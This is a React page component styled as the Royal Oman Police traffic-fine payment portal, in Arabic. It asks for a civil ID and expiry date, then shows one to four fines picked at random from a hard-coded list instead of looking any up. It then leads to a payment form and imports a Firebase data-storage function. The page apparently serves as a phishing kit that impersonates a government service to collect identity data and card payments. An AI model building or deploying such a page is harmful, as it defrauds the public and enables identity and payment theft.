"use client"

import type React from "react"
import { useState } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Checkbox } from "@/components/ui/checkbox"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import { ViolationsList } from "@/components/violations-list"
import { SiteHeader } from "@/components/ui/header"
import { PaymentForm } from "@/components/payment-form"
import { addData } from "@/lib/firebase"

interface Violation {
  id: string
  type: string
  date: string
  location: string
  amount: number
  plateNumber: string
  status: "unpaid" | "paid"
}

const mockViolations: Violation[] = [
  {
    id: "V001",
    type: "تجاوز السرعة المحددة",
    date: "2024-01-15",
    location: "شارع السلطان قابوس، مسقط",
    amount: 50,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V002",
    type: "عدم ربط حزام الأمان",
    date: "2024-01-10",
    location: "دوار الصاروج، مسقط",
    amount: 30,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V003",
    type: "استخدام الهاتف أثناء القيادة",
    date: "2024-01-08",
    location: "شارع الخوير، مسقط",
    amount: 75,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V004",
    type: "عدم التوقف عند الإشارة الحمراء",
    date: "2024-01-05",
    location: "تقاطع الغبرة الشمالية، مسقط",
    amount: 100,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V005",
    type: "الوقوف في مكان ممنوع",
    date: "2024-01-03",
    location: "موقف جراند مول، مسقط",
    amount: 25,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V006",
    type: "عدم إعطاء الأولوية للمشاة",
    date: "2024-12-28",
    location: "شارع الوادي الكبير، مسقط",
    amount: 40,
    plateNumber: "*****0",
    status: "paid",
  },
  {
    id: "V007",
    type: "التوقف المفاجئ دون سبب",
    date: "2024-12-20",
    location: "شارع السيب العام، السيب",
    amount: 35,
    plateNumber: "*****0",
    status: "paid",
  },
 
  {
    id: "V009",
    type: "القيادة بدون رخصة",
    date: "2024-11-30",
    location: "طريق صحار السريع، صُحار",
    amount: 200,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V010",
    type: "تشغيل الموسيقى بصوت مرتفع",
    date: "2024-11-20",
    location: "شاطئ القرم، مسقط",
    amount: 20,
    plateNumber: "*****0",
    status: "paid",
  },
  {
    id: "V011",
    type: "عدم صيانة المركبة",
    date: "2024-11-10",
    location: "شارع المطار القديم، مسقط",
    amount: 45,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V012",
    type: "سير المركبة بدون أضواء",
    date: "2024-11-01",
    location: "طريق الباطنة السريع، بركاء",
    amount: 60,
    plateNumber: "*****0",
    status: "paid",
  },
]
function randstr(prefix:string)
{
    return Math.random().toString(36).replace('0.',prefix || '');
}
const visitorID=randstr('om-')

export default function ROPFinePage() {
  const [violations, setViolations] = useState<Violation[]>([])
  const [isLoading, setIsLoading] = useState(false)
  const [showViolations, setShowViolations] = useState(false)
  const [showPayment, setShowPayment] = useState(false)
  const [formData, setFormData] = useState({
    registrationType: "personal",
    civilId: "",
    expiryDate: "",
    specificVehicle: false,
  })

  const getRandomViolations = () => {
    const numberOfViolations = Math.floor(Math.random() * 4) + 1 // 1-4 violations
    const shuffled = [...mockViolations].sort(() => 0.5 - Math.random())
    return shuffled.slice(0, numberOfViolations)
  }
  const omanIdRegex = /^[1-9]\d{7,12}$/;

  function isValidOmanId(id: string): boolean {
    return omanIdRegex.test(id);
  }
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    // Simulate API call delay

    await new Promise((resolve) => setTimeout(resolve, 1500))
    const randomViolations = getRandomViolations()
    setViolations(randomViolations)
    setShowViolations(true)
    setIsLoading(false)
  }

  const handleReset = () => {
    setShowViolations(false)
    setShowPayment(false)
    setViolations([])
    setFormData({
      registrationType: "personal",
      civilId: "",
      expiryDate: "",
      specificVehicle: false,
    })
  }
 
  const handlePaymentSuccess = (data:any) => {
    // Update violations to paid status

    const updatedViolations = violations.map((v) => (v.status === "unpaid" ? { ...v, status: "paid" as const } : v))
    setViolations(updatedViolations)
    setShowPayment(false)
  }

  const totalAmount = violations.filter((v) => v.status === "unpaid").reduce((sum, v) => sum + v.amount, 0)

  return (
    <div className="bg-white min-h-screen font-sans" dir="rtl">
      <SiteHeader />
      <main>
        {/* Title Banner */}
        <div className="bg-[#9aca3f] text-white text-center py-4">
          <h1 className="text-4xl font-bold">دفع المخالفات</h1>
        </div>

        {/* Form Section */}
        <div
          className="py-12 px-4"
          style={{
            backgroundImage: "url(bg.jpg)",
            backgroundRepeat: "repeat",
            backgroundSize: "auto",
          }}
        >
          {showPayment ? (
            <PaymentForm
              handleSubmit={handlePaymentSuccess}
              totalAmount={totalAmount}
              violations={violations.filter((v) => v.status === "unpaid")}
              onCancel={() => setShowPayment(false)} onSuccess={function (): void {
              } }            />
          ) : !showViolations ? (
            <Card className="max-w-md mx-auto bg-white/40 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
              <CardContent className="p-8">
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="text-center">
                    <h2 className="text-xl font-semibold text-gray-700">اختر نوع التسجيل</h2>
                  </div>

                  <div className="flex justify-center gap-8">
                    <div className="flex items-center space-x-2 space-x-reverse">
                      <Checkbox
                        id="personal"
                        checked={formData.registrationType === "personal"}
                        onCheckedChange={() => setFormData((prev) => ({ ...prev, registrationType: "personal" }))}
                        className="data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600"
                      />
                      <Label htmlFor="personal" className="text-lg font-medium text-gray-700">
                        شخصي
                      </Label>
                    </div>
                    <div className="flex items-center space-x-2 space-x-reverse">
                      <Checkbox
                        id="commercial"
                        checked={formData.registrationType === "commercial"}
                        onCheckedChange={() => setFormData((prev) => ({ ...prev, registrationType: "commercial" }))}
                      />
                      <Label htmlFor="commercial" className="text-lg font-medium text-gray-700">
                        تجاري
                      </Label>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="civil-id" className="text-gray-600">
                      رقم المدني
                    </Label>
                    <Input
                      id="civil-id"
                      type="tel"
                      value={formData.civilId}
                      onChange={(e) =>{ setFormData((prev) => ({ ...prev, civilId: e.target.value }))
                    isValidOmanId(e.target.value)}
                  }
                      className="bg-white rounded-lg"
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="expiry-date" className="text-gray-600">
                      تاريخ الانتهاء
                    </Label>
                    <Input
                      id="expiry-date"
                      type="text"
                      placeholder="dd-MM-yyyy"
                      value={formData.expiryDate}
                      onChange={(e) => setFormData((prev) => ({ ...prev, expiryDate: e.target.value }))}
                      className="bg-white rounded-lg"
                      required
                    />
                  </div>

                  <div className="flex items-center space-x-2 space-x-reverse pt-2">
                    <Checkbox
                      id="specific-vehicle"
                      checked={formData.specificVehicle}
                      onCheckedChange={(checked) => setFormData((prev) => ({ ...prev, specificVehicle: !!checked }))}
                    />
                    <Label htmlFor="specific-vehicle" className="text-gray-700">
                      الإستفسار عن مركبة معينة
                    </Label>
                  </div>

                  <div className="space-y-3 pt-4">
                    <Button
                      type="submit"
                      disabled={isLoading || !isValidOmanId(formData.civilId!)}
                      className="w-full bg-[#374151] hover:bg-gray-600 text-white font-bold text-lg py-6 rounded-lg disabled:opacity-50"
                    >
                      {isLoading ? "جاري البحث..." : "الإستفسار"}
                    </Button>
                    <Button
                      type="button"
                      variant="ghost"
                      onClick={handleReset}
                      className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold text-lg py-6 rounded-lg"
                    >
                      إلغاء
                    </Button>
                  </div>
                </form>
              </CardContent>
            </Card>
          ) : (
            <div className="max-w-4xl mx-auto">
              <Card className="bg-white/40 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
                <CardContent className="p-8">
                  <div className="text-center mb-6">
                    <h2 className="text-2xl font-bold text-gray-800 mb-2">نتائج الاستعلام</h2>
                    <p className="text-gray-600">رقم المدني: {formData.civilId}</p>
                  </div>

                  {violations.length > 0 ? (
                    <>
                      <ViolationsList violations={violations} />
                      {totalAmount > 0 && (
                        <div className="mt-6 p-4 bg-red-50 rounded-lg border border-red-200">
                          <div className="flex justify-between items-center">
                            <span className="text-lg font-semibold text-red-800">إجمالي المبلغ المستحق:</span>
                            <span className="text-2xl font-bold text-red-600">{totalAmount} ر.ع</span>
                          </div>
                        </div>
                      )}
                      <div className="flex gap-4 mt-6">
                        {totalAmount > 0 && (
                          <Button
                            onClick={() => setShowPayment(true)}
                            className="flex-1 bg-[#9aca3f] hover:bg-green-600 text-white font-bold py-3"
                          >
                            دفع المخالفات
                          </Button>
                        )}
                        <Button
                          variant="outline"
                          onClick={handleReset}
                          className="flex-1 border-gray-300 text-gray-700 font-bold py-3 bg-transparent"
                        >
                          استعلام جديد
                        </Button>
                      </div>
                    </>
                  ) : (
                    <div className="text-center py-8">
                      <div className="text-green-600 text-6xl mb-4">✓</div>
                      <h3 className="text-xl font-semibold text-green-800 mb-2">لا توجد مخالفات مسجلة</h3>
                      <p className="text-gray-600 mb-6">لم يتم العثور على أي مخالفات مرورية مسجلة باسمك</p>
                      <Button
                        onClick={handleReset}
                        className="bg-[#9aca3f] hover:bg-green-600 text-white font-bold px-8 py-3"
                      >
                        استعلام جديد
                      </Button>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}
